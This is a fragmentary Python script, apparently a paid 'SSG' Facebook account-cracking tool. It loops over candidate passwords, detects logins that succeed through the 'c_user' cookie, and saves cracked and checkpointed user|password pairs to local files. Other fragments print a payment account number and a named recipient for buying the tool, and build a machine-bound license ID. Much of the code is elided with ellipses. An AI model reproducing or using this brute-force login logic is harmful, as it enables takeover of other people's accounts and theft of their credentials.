...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    input("\x1b[1;97mPress enter to back SSG Menu ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [SSG-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('SSG_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [SSG-CP] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('SSG_CP.txt' , 'a').write('%s\n' % wrt)
...
def bnsbuy():
    ...
    if to in r:
        ...
        print('\rAccount Number 03464673739\n')

        print('\rAccount Name Aziz urrahim\n')
...
def bnsreg():
    ...
    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~SSG=="
